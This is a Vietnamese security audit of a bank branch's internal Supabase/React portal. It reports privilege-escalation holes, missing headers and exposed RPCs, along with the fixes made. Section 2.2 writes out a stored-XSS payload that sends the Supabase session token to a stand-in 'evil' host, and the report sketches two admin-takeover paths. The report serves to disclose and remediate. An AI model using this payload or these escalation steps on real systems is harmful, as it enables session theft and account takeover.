# RÀ SOÁT BẢO MẬT: CHỐNG DDoS & LỘ LỌT DỮ LIỆU
## Cổng nội bộ "Bắc Hưng Yên ONE" — VietinBank CN Bắc Hưng Yên

**Ngày rà soát:** 03/08/2026
**Phạm vi:** 128 migration CSDL, 24 edge function, toàn bộ mã nguồn React (`src/`), cấu hình hosting (Cloudflare Workers + Vercel), thư viện phụ thuộc, **và trạng thái thật của project Supabase production** (`whlysprzsguehxmrjwha`).
**Cách làm:** không suy đoán từ file migration. Mọi kết luận về phân quyền đều đối chiếu trực tiếp với `pg_policies`, `pg_proc`, `storage.buckets` trên production và Supabase Security Advisor.

---

## 1. KẾT LUẬN TỔNG THỂ

**Nền tảng bảo mật của hệ thống là VỮNG.** Ba phép kiểm chứng quan trọng nhất đều đạt:

| Phép kiểm chứng | Kết quả |
|---|---|
| Supabase Advisor — lỗi mức ERROR | **0 lỗi** |
| Bảng ở schema `public` bị tắt RLS | **0 bảng** (toàn bộ ~110 bảng đều bật) |
| Policy cho phép người **chưa đăng nhập** đọc dữ liệu thật | **0 policy** |

Nghĩa là: không tồn tại đường cho người lạ trên Internet dùng anon key để hút dữ liệu ra — kịch bản "đánh cắp cả cơ sở dữ liệu" mà các ứng dụng Supabase hay dính. Đây là điểm mạnh thật sự, không phải nhận xét xã giao. Mọi policy gắn vai trò `{public}` đều chốt bằng `auth.uid()` / `get_my_profile_id()` / `auth.role()='service_role'` — với người chưa đăng nhập, các hàm này trả NULL nên không ra dòng nào.

**Rủi ro thật nằm ở chỗ khác: tầng đặc quyền quản trị.** Hai edge function chạy bằng `service_role` (bỏ qua toàn bộ RLS) thiếu chốt chặn leo thang, cho phép một `tcth_admin` chiếm quyền `system_admin` — tức là chiếm toàn bộ dữ liệu. Đây là lỗ hổng nghiêm trọng nhất phát hiện được, và **đã được vá trong lần rà soát này**.

Cần nói rõ mức độ khẩn: hệ thống có **101 tài khoản, 0 tài khoản bật MFA**, và 3 tài khoản quyền cao. Khi không có xác thực hai lớp, một mật khẩu quản trị bị lộ là mất trắng dữ liệu — nên các lỗ hổng leo thang quyền bên dưới không phải rủi ro lý thuyết.

---

## 2. ĐÃ VÁ TRONG LẦN RÀ SOÁT NÀY

### 2.1. 🔴 NGHIÊM TRỌNG — `tcth_admin` chiếm được quyền `system_admin` (2 đường)

Mô hình phân quyền của hệ thống quy định rõ (`_shared/roles.ts`): chỉ `system_admin` được cấp các vai trò cấp cao (`system_admin`, `tcth_admin`, `bgd`). Nguyên tắc này được cưỡng chế đúng ở `_shared/staff.ts` và `update-staff-email`, nhưng **bị bỏ sót ở hai hàm khác**:

**a) `reset-staff-password` — đặt lại mật khẩu của quản trị viên rồi đăng nhập bằng chính mật khẩu đó**

Hàm cho phép cả `system_admin` lẫn `tcth_admin` gọi, có chặn tự đặt lại cho chính mình, nhưng **không hề kiểm tra tài khoản đích đang giữ vai trò gì**. Nó đặt mật khẩu mới rồi trả thẳng `temp_password` về trong phản hồi.

> Kịch bản khai thác: một `tcth_admin` gọi hàm với `profile_id` của `system_admin` → nhận mật khẩu tạm ngay trong phản hồi → đăng nhập với quyền cao nhất → toàn quyền đọc/xoá dữ liệu.

**b) `approve-registration` — tự phong vai trò khi duyệt hồ sơ đăng ký**

Vai trò gán cho tài khoản mới lấy **thẳng từ body request** (`assigned_role`), không qua `canAssignRole` cũng không qua `isValidRole`.

> Kịch bản khai thác: một `tcth_admin` (hoặc `bgd`) tự nộp hồ sơ đăng ký bằng email của mình, rồi tự duyệt với `{"assigned_role": "system_admin"}` → có ngay tài khoản toàn quyền kèm mật khẩu tạm.

**Đã vá:** bổ sung chốt chặn theo đúng khuôn mẫu sẵn có trong `_shared/staff.ts` — `reset-staff-password` nay chặn thao tác lên tài khoản giữ vai trò quản trị (trừ khi người gọi là `system_admin`); `approve-registration` nay kiểm tra `isValidRole` + `canAssignRole` trước khi tạo tài khoản. Luồng từ chối hồ sơ không bị ảnh hưởng.

### 2.2. 🟠 XSS lưu trữ qua ô "bằng chứng đính kèm" → mất phiên đăng nhập

Trường `evidence_url` do cán bộ tự gõ tự do, được render thẳng vào `href` ở hai nơi (`CardDetailDialog.tsx`, `LeadershipMarksPage.tsx`). React **không** tự lọc `href`.

> Kịch bản: một cán bộ lưu `javascript:fetch('https://evil/?t='+localStorage.getItem('sb-...-auth-token'))` làm "bằng chứng". Người duyệt bấm vào là token phiên bị gửi ra ngoài — vì token Supabase nằm ở `localStorage`. Kẻ tấn công dùng token đó truy cập với đúng quyền của nạn nhân.

**Đã vá:** thêm `src/lib/safeUrl.ts` chỉ cho qua `http/https/mailto`; giá trị khác hiển thị dạng chữ thường thay vì liên kết bấm được. Kèm 6 unit test.

### 2.3. 🟠 Thiếu TOÀN BỘ security header

Trước rà soát, cả `vercel.json` lẫn `public/_headers` chỉ đặt `X-Robots-Tag` và `Cache-Control`. Không có CSP, HSTS, chống nhúng khung, chống đoán kiểu file.

**Đã vá** (áp cho cả Cloudflare và Vercel): `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`.

CSP được cắt may theo đúng nguồn trang thật sự dùng — đã kiểm tra và mở thêm `images.unsplash.com`, `i.ibb.co` vì thư viện trụ cột và cây văn hoá đang hiển thị ảnh từ đó (nếu không sẽ **vỡ ảnh trên production**). `connect-src` chỉ cho `'self'` và `*.supabase.co`: đây là directive quan trọng nhất — kể cả sau này có lỗi XSS khác, token cũng không gửi ra miền lạ được.

### 2.4. 🟡 Thư viện có lỗ hổng đã biết

Đã chạy `npm audit fix` (không breaking): xử lý xong `postcss` (path traversal, mức cao), `brace-expansion` (ReDoS, mức cao), `dompurify`. `react-router` nâng 6.30.1 → 6.30.4. Kiểm chứng lại: **506/506 test pass, build thành công**.

---

## 3. CẦN XỬ LÝ — KHÔNG TỰ ĐỘNG ÁP DỤNG

Những mục dưới đây đụng tới cấu hình production hoặc hành vi nghiệp vụ, nên tôi chuẩn bị sẵn nhưng **để Chi nhánh quyết định và tự áp dụng**.

### 3.1. 🟠 Hai hàm RPC người CHƯA ĐĂNG NHẬP vẫn gọi được (rò rỉ PII)

Đây là lỗi tinh vi, đáng ghi nhớ cho về sau. Postgres mặc định cấp `EXECUTE` cho `PUBLIC` khi tạo function. Hai migration cũ viết:

```sql
REVOKE ALL ON FUNCTION ... FROM anon;   -- ❌ KHÔNG có tác dụng
```

`anon` thừa hưởng quyền từ `PUBLIC`, nên revoke riêng `anon` **không gỡ được gì**. Kiểm chứng trên production xác nhận cả hai hàm vẫn gọi được bằng anon key:

- `suggest_skill_mentors(uuid, uuid, int)` — chạy `SECURITY DEFINER` nên **bỏ qua RLS**, trả về **họ tên cán bộ + phòng ban + mức năng lực**.
- `get_campaign_progress(uuid)` — trả về số liệu tổng hợp.

Rào cản duy nhất hiện nay là kẻ tấn công phải đoán đúng cặp UUID `(skill_id, cycle_id)` — UUID ngẫu nhiên nên chưa khai thác được ngay. Nhưng đây là rò rỉ PII thật và không có lý do gì để mở.

Cách viết đúng đã được dùng ở migration mới hơn (`20260811090000_ra_soat_phan_quyen_bhy_ways.sql`): **luôn `REVOKE ... FROM PUBLIC, anon`** rồi `GRANT` lại đúng đối tượng.

**→ Đã chuẩn bị:** `supabase/migrations/20260815090000_va_lo_hong_anon_execute_va_is_staff.sql`.

### 3.2. 🟠 `is_staff()` hiểu "cán bộ" quá rộng

Định nghĩa hiện tại trên production:

```sql
is_staff(_user_id) = _user_id IS NOT NULL AND NOT is_guest(_user_id)
```

`is_guest()` dựa vào việc **có** dòng vai trò `guest`. Một tài khoản vừa tạo, chưa có dòng vai trò nào, sẽ cho `is_guest = false` ⇒ **`is_staff = TRUE` ngay lập tức**.

> Hệ quả: **nếu Supabase Auth đang bật đăng ký công khai**, người ngoài tự đăng ký một tài khoản là đọc được toàn bộ tầng dữ liệu gác bằng `is_staff()` — trong đó có `portal_credit_sessions` chứa **tên khách hàng, doanh thu thực, hạn mức tín dụng**.

**Việc cần làm ngay (2 phút):** vào Supabase → Authentication → Sign In / Providers → tắt **"Allow new users to sign up"**. Tài khoản chỉ nên sinh ra từ các edge function `create-staff-user` / `bulk-create-staff-users` / `approve-registration`.

**Vá ở tầng CSDL** (trong migration đã chuẩn bị): buộc `is_staff()` phải có hồ sơ thật trong `profiles`. Đã kiểm tra: **101/101 tài khoản hiện có đều có hồ sơ**, nên áp dụng không ai mất quyền.

### 3.3. 🟡 Dữ liệu tín dụng khách hàng mở cho mọi cán bộ

`portal_credit_sessions` có policy `USING (is_staff(auth.uid()))` — **mọi cán bộ, bất kể phòng nào, đọc được toàn bộ** tên khách hàng, doanh thu, hạn mức.

Điều đáng chú ý: chính hệ thống này đã làm đúng ở chỗ khác — bảng hồ sơ tín dụng chính thức `ct2_ho_so_tin_dung` được giới hạn theo phòng (`is_my_scope_department`). Hai bảng cùng loại dữ liệu nhưng hai mức bảo vệ khác nhau.

Đây là **quyết định nghiệp vụ**: nếu không yêu cầu toàn chi nhánh cùng xem, nên siết theo phòng (gợi ý SQL có trong migration). Chưa áp dụng vì sẽ đổi hành vi màn hình "Tín dụng 360".

### 3.4. 🟡 Kho ảnh `avatars` mở công khai ra Internet

Bucket `avatars` đang đặt `public = true` kèm policy đọc cho `{public}`. Người lạ không cần đăng nhập vẫn **liệt kê và tải được toàn bộ ảnh**. Ảnh lưu theo thư mục đặt tên bằng `auth.uid()`, nên việc liệt kê còn **lộ luôn danh sách user ID nội bộ** — ghép với các hàm `has_role(user_id, ...)` đang mở cho anon thì có thể dò ra ai là quản trị viên, tạo danh sách mục tiêu để lừa đảo.

**Mức độ hiện tại thấp: bucket mới có 1 file.** Nhưng rủi ro lớn dần theo số cán bộ tải ảnh, nên nên xử lý sớm.

Lưu ý khi sửa: `EditMyProfile.tsx` đang dùng `getPublicUrl`, **khoá bucket là mất ảnh đại diện**. Repo đã có sẵn mẫu URL ký hạn trong `src/lib/oneStorage.ts` (dùng cho bucket riêng `bhy-one`) — chuyển sang `createSignedUrl` theo mẫu đó rồi mới đặt `public = false`.

### 3.5. 🟡 Chưa bật chặn mật khẩu đã lộ, chưa có MFA

- Supabase Advisor báo **"Leaked password protection" đang TẮT** → cán bộ đặt được mật khẩu đã nằm trong các vụ lộ dữ liệu công khai. Bật ở Authentication → Passwords (miễn phí, không ảnh hưởng người dùng hiện tại).
- **0/101 tài khoản bật MFA.** Ít nhất 3 tài khoản quyền cao (`system_admin`, `tcth_admin`, `bgd`) nên bắt buộc MFA.

Đây là hai biện pháp rẻ nhất nhưng chặn được đường tấn công phổ biến nhất: dò mật khẩu / dùng lại mật khẩu đã lộ.

### 3.6. 🟡 Có hàm chạy trên production nhưng KHÔNG có trong mã nguồn

Hàm `decide_plan_change_request(uuid, boolean, text)` — `SECURITY DEFINER`, ghi dữ liệu vào 5 bảng — **tồn tại trên production nhưng không có trong bất kỳ migration nào của repo**.

Bản thân hàm này an toàn (đã đọc mã: có chốt kiểm tra người gọi phải là người đánh giá của phiếu hoặc `system_admin`). Vấn đề là **quy trình**: có mã đặc quyền chạy trên production mà chưa từng qua review, không tái lập được khi khôi phục, và lần rà soát sau sẽ lại bỏ sót. Nên trích xuất định nghĩa hàm về thành một migration để đưa vào quản lý phiên bản.

---

## 4. VỀ CHỐNG DDoS

Trang này là SPA tĩnh nên **tư thế chống DDoS vốn đã thuận lợi**, nhưng chưa khai thác hết:

**Đang tốt:**
- Production chạy trên **Cloudflare Workers** (`wrangler.jsonc`, worker `343-noi-bo`) → tấn công lưu lượng lớn tầng mạng (L3/L4) được Cloudflare hấp thụ sẵn.
- Tài sản build gắn hash nội dung, cache vĩnh viễn → phục vụ rất rẻ, khó làm quá tải.
- Hàm `ai-advisor` (tốn tiền theo lượt gọi) đã có giới hạn 40 lượt/giờ mỗi người, 1000 lượt/giờ toàn hệ thống, kèm trần ngân sách tháng.

**Còn thiếu:**
1. **Chưa bật WAF và rate limiting trên Cloudflare.** Cấu hình trong repo chỉ phục vụ file tĩnh, không có luật chặn nào. Nên bật WAF managed rules + một luật giới hạn tần suất cho zone. Đây là việc bấm trong bảng điều khiển Cloudflare, không cần sửa mã.
2. **Bề mặt chịu tải thật là Supabase, không phải trang web.** Anon key công khai nên API CSDL luôn tiếp cận được từ Internet; lớp bảo vệ là RLS (đang tốt) cộng giới hạn sẵn có của Supabase. Đáng cân nhắc bật rate limiting phía Supabase cho endpoint đăng nhập.
3. **`registration_requests` cho người chưa đăng nhập ghi vào** (đúng thiết kế — form đăng ký công khai) nhưng **không có CAPTCHA hay giới hạn tần suất** → có thể bị bơm rác hàng loạt. Nên thêm Cloudflare Turnstile.
4. Màn hình Quizzi trực tiếp hỏi CSDL mỗi 2 giây (`QuizLiveLobbyPage`, `QuizLiveHostPage`) — chỉ trong lúc có phiên thi nên chấp nhận được, nhưng nếu mở rộng nhiều phiên đồng thời thì nên chuyển sang Realtime thay vì hỏi vòng.

Lỗ hổng `vite`/`esbuild` còn lại sau khi vá **chỉ ảnh hưởng máy lập trình viên khi chạy `npm run dev`, không đi vào bản production** — khắc phục cần nâng Vite lên bản lớn, nên xếp vào bảo trì định kỳ chứ không khẩn cấp.

---

## 5. ĐÍNH CHÍNH MỘT CẢNH BÁO SAI

Trong quá trình rà soát, một luồng phân tích tự động kết luận rằng policy `user_roles` cho phép `tcth_admin`/`bgd` tự thăng cấp thành `system_admin` bằng cách gọi thẳng API, và xếp mức HIGH.

**Kết luận này SAI với production.** Kiểm chứng trực tiếp `pg_policies` cho thấy policy lỏng đó đã bị migration sau thay thế. Trạng thái thật hiện nay:

| Policy | Lệnh | Điều kiện |
|---|---|---|
| `System admin can manage all roles` | ALL | `has_role(auth.uid(),'system_admin')` — cả USING lẫn WITH CHECK |
| `BGD TCTH can view roles` | SELECT | chỉ xem |
| `Users can view own role` | SELECT | dòng của chính mình |

Tức là **tầng CSDL đã chặn đúng**: `tcth_admin`/`bgd` chỉ đọc được vai trò, không ghi. Đường leo thang thật sự đi qua edge function (chạy `service_role` nên bỏ qua RLS) — chính là hai lỗ hổng ở mục 2.1 đã vá.

Ghi lại đính chính này vì nó cho thấy nguyên tắc quan trọng: **với 128 migration chồng lấn nhau, chỉ đọc file SQL sẽ ra kết luận sai — phải đối chiếu trạng thái thật của production.**

---

## 6. THỨ TỰ VIỆC CẦN LÀM

**Làm ngay, không cần sửa mã (10 phút, trong bảng điều khiển Supabase):**
1. Tắt đăng ký công khai (Authentication → Sign In / Providers) — chặn đường ở mục 3.2.
2. Bật "Leaked password protection" (Authentication → Passwords).
3. Bật MFA cho 3 tài khoản quyền cao.

**Triển khai bản vá mã nguồn (đã có trong nhánh này):**
4. Phát hành lại để 2 edge function đã vá và bộ security header có hiệu lực.
5. Áp dụng migration `20260815090000_...sql` sau khi review.

**Trong bảng điều khiển Cloudflare:**
6. Bật WAF managed rules + rate limiting.

**Việc cần quyết định nghiệp vụ:**
7. Có siết `portal_credit_sessions` theo phòng không (mục 3.3).
8. Chuyển `avatars` sang URL ký hạn rồi khoá bucket (mục 3.4).
9. Đưa `decide_plan_change_request` về quản lý phiên bản (mục 3.6).

---

## 7. GHI NHẬN NHỮNG ĐIỂM LÀM TỐT

Cần nói rõ để không tạo ấn tượng sai: đây là hệ thống được xây dựng **có ý thức bảo mật rõ rệt**, trên mặt bằng chung của ứng dụng nội bộ cấp chi nhánh thì thuộc nhóm tốt.

- **Không có secret nào bị commit.** Toàn bộ script nhập liệu đọc `SUPABASE_SERVICE_ROLE_KEY` từ biến môi trường và dừng nếu thiếu, kèm ghi chú "TUYỆT ĐỐI không commit key". `.gitignore` chặn `.env*`. Anon key nằm trong mã là **đúng thiết kế** (khoá công khai, bảo vệ bằng RLS).
- **Bốn edge function tắt `verify_jwt` đều tự xác thực** bằng chữ ký HMAC webhook, shared secret, hoặc token dùng-một-lần. Đây là nhóm rủi ro cao nhất và đã được xử lý đúng.
- **Markdown an toàn mặc định:** dùng `react-markdown` ở ~9 chỗ nhưng **không** bật `rehype-raw` hay `allowDangerousHtml` ở bất kỳ đâu. Giữ nguyên nguyên tắc này.
- **Phân quyền phía giao diện được ghi chú thẳng là chỉ để điều hướng** ("RLS phía server vẫn là hàng rào thật" — `AdminRoute.tsx`), và thực tế có RLS phía sau. Đây là tư duy đúng.
- **Service worker không cache gì** → không có rủi ro đầu độc cache hay lộ phản hồi đã đăng nhập.
- **Trợ lý AI ẩn danh hoá dữ liệu** (bỏ tên, mã cán bộ, tên quản lý) trước khi gửi ra nhà cung cấp bên ngoài.
- **`xlsx` đã trỏ sang bản fork được bảo trì** `@e965/xlsx` — đúng cách xử lý CVE của SheetJS. Giữ nguyên.

---

*Rà soát thực hiện ngày 03/08/2026. Kiểm chứng sau thay đổi: 506/506 unit test pass, build production thành công, `_headers` đã vào `dist/`.*
